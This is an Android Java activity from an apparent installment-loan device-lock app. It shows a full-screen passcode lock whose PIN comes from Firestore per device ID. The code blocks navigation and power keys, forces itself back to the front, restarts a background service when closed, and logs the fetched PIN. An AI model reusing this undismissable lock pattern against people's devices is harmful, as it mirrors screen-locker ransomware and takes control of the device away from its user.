package com.emi.systemconfiguration;

import androidx.annotation.Nullable;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;

import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.EventListener;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.FirebaseFirestoreException;
import com.hanks.passcodeview.PasscodeView;

import java.text.DecimalFormat;
import java.text.NumberFormat;
import java.util.Random;

public class Lock extends AppCompatActivity {

    private FirebaseFirestore db;
    PasscodeView passcodeView;

    private BackgroundService backgroundService;
    Intent mServiceIntent;

    private int currentApiVersion;
//    String pin;

    String prevStarted = "yes";
    @Override
    protected void onResume() {
        super.onResume();
        SharedPreferences sharedpreferences = getSharedPreferences(getString(R.string.app_name), Context.MODE_PRIVATE);
        if (!sharedpreferences.getBoolean(prevStarted, false)) {
            SharedPreferences.Editor editor = sharedpreferences.edit();
            editor.putBoolean(prevStarted, Boolean.TRUE);
            editor.apply();
        } else {
//            moveToSecondary();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lock);
        passcodeView = findViewById(R.id.passcodeView);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,
                WindowManager.LayoutParams.FLAG_SECURE);

        ActionBar actionBar = getSupportActionBar();
        actionBar.hide();

        db = FirebaseFirestore.getInstance();

        checkPassword();
        // Hide Status Bar
        if (Build.VERSION.SDK_INT < 16) {
            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN);

        }
        else {
            View decorView = getWindow().getDecorView();
            // Hide Status Bar.
            int uiOptions = View.SYSTEM_UI_FLAG_FULLSCREEN;
            decorView.setSystemUiVisibility(uiOptions);
        }

        if (getActionBar() != null) {
            actionBar.setHomeButtonEnabled(false); // disable the button
            actionBar.setDisplayHomeAsUpEnabled(false); // remove the left caret
            actionBar.setDisplayShowHomeEnabled(false); // remove the icon
        }
//        IntentFilter intentFilter = new IntentFilter();
//        intentFilter.addAction("Counter");
//
//        BroadcastReciever broadcastReciever = new BroadcastReciever(){
//            @Override
//            public void onReceive(Context context, Intent intent) {
//                Integer integerTime = intent.getIntExtra("TimeRemaining", 0);
//
//            }
//        };
//
//        registerReceiver(broadcastReciever, intentFilter);
        final int flags = View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY;

        currentApiVersion = Build.VERSION.SDK_INT;
        if(currentApiVersion >= Build.VERSION_CODES.KITKAT)
        {

            getWindow().getDecorView().setSystemUiVisibility(flags);

            // Code below is to handle presses of Volume up or Volume down.
            // Without this, after pressing volume buttons, the navigation bar will
            // show up and won't hide
            final View decorView = getWindow().getDecorView();
            decorView
                    .setOnSystemUiVisibilityChangeListener(new View.OnSystemUiVisibilityChangeListener()
                    {

                        @Override
                        public void onSystemUiVisibilityChange(int visibility)
                        {
                            if((visibility & View.SYSTEM_UI_FLAG_FULLSCREEN) == 0)
                            {
                                decorView.setSystemUiVisibility(flags);
                            }
                        }
                    });
        }
//Screen Pinning
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//            startLockTask();
//        }

    }

    @SuppressLint("NewApi")
    @Override
    public void onWindowFocusChanged(boolean hasFocus)
    {
        super.onWindowFocusChanged(hasFocus);
        if(currentApiVersion >= Build.VERSION_CODES.KITKAT && hasFocus)
        {
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
        }
    }

    private void setPassword(String pin){

        passcodeView.setPasscodeLength(5).setLocalPasscode(pin).setListener(new PasscodeView.PasscodeViewListener() {
            @Override
            public void onFail() {
                Toast.makeText(Lock.this, " Password is Wrong", Toast.LENGTH_SHORT).show();
//                homeScreenIntent();
            }

            @Override
            public void onSuccess(String number) {
                Toast.makeText(Lock.this, "Code is right", Toast.LENGTH_SHORT).show();
                countDown();
//                PackageManager packageManager = getPackageManager();

//                ComponentName componentName = new ComponentName(getApplicationContext(),MainActivity.class);
//                packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//                        PackageManager.DONT_KILL_APP);
//                finish();
//                count();
            }
        });
    }

    @Override
    protected void onPause() {
        super.onPause();

        ActivityManager activityManager = (ActivityManager) getApplicationContext()
                .getSystemService(Context.ACTIVITY_SERVICE);
        activityManager.moveTaskToFront(getTaskId(), 0);
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {

        switch( event.getKeyCode() ) {

            case KeyEvent.KEYCODE_MENU:
                return true;
            case KeyEvent.KEYCODE_VOLUME_UP:
                return true;

            case KeyEvent.KEYCODE_VOLUME_DOWN:
                return true;

            case KeyEvent.KEYCODE_BACK:
                return true;

            case KeyEvent.KEYCODE_HOME:
                return  true;

            case KeyEvent.KEYCODE_POWER:
                return  true;

            case KeyEvent.KEYCODE_MOVE_HOME:
                return  true;
            default:
                return super.dispatchKeyEvent(event);
        }
    }


    private void checkPassword(){
        Boolean  isconnected=MainActivity.isConnected(getApplicationContext());

        if (isconnected) {
            String deviceId = MainActivity.getDeviceId(this);
            DocumentReference documentReference = db.collection("users").document(deviceId);
            documentReference.addSnapshotListener(new EventListener<DocumentSnapshot>() {
                @Override
                public void onEvent(@Nullable DocumentSnapshot value, @Nullable FirebaseFirestoreException error) {
                    if (error != null) {
                        // this method is called when error is not null
                        // and we gt any error
                        // in this cas we are displaying an error message.
                        Log.d("Error is","Error found" + error);
//                        setPassword("69691");
                        return;
                    }
                    if (value != null && value.exists()) {
                        String pin = value.getData().get("customer_pincode").toString();
                        Log.d("Found the", value.getData().toString());
                        setPassword(pin);

                    }
                }
            });
        } else {
            Toast.makeText(getApplicationContext(), "No Internet Connection", Toast.LENGTH_SHORT).show();
//            setPassword("69691");
        }
    }

    private  void countDown(){
        Boolean  isconnected=MainActivity.isConnected(getApplicationContext());

        if (isconnected) {

            String deviceId = MainActivity.getDeviceId(this);
//            startActivity(new Intent(android.provider.Settings.ACTION_SETTINGS));

            db.collection("users").document(deviceId).update("customer_active", false);
            finish();
//            new CountDownTimer(10000, 1000) {
//                public void onTick(long millisUntilFinished) {
//                    // Used for formatting digit to be in 2 digits only
//                    NumberFormat f = new DecimalFormat("00");
//                    long hour = (millisUntilFinished / 3600000) % 24;
//                    long min = (millisUntilFinished / 60000) % 60;
//                    long sec = (millisUntilFinished / 1000) % 60;
//                    Log.d("Count DOWN", f.format(hour) + ":" + f.format(min) + ":" + f.format(sec));
//                }
//
//                // When the task is over it will print 00:00:00 there
//                public void onFinish() {
//                    Log.d("Count DOWN", "finished");
//                    Random r = new Random();
//                    int randomNumber =10000 + r.nextInt(90000);
//                    Log.d("Random number", String.valueOf(randomNumber ));
//                    db.collection("users").document(deviceId).update("customer_active", true,"customer_pincode",String.valueOf(randomNumber));
//                    startBgActivity();
//
//                }
//            }.start();
        }
        else
        {
            startBgActivity();
        }
    }

    public void count(){
        Intent intentService = new Intent(this, BackgroundDelayService.class);
        startService(intentService);
    }

    @Override
    public void finish() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            super.finishAndRemoveTask();
        }
        else {
            super.finish();
        }
    }

    @Override
    public void onBackPressed() {
      homeScreenIntent();
      startBgActivity();
    }

    public void homeScreenIntent(){
        Intent startMain = new Intent(Intent.ACTION_MAIN);
        startMain.addCategory(Intent.CATEGORY_HOME);
        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(startMain);
    }

    public  void startBgActivity(){
        backgroundService = new BackgroundService();
        mServiceIntent = new Intent(getApplicationContext(), backgroundService.getClass());
        startService(mServiceIntent);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        startBgActivity();
    }


}
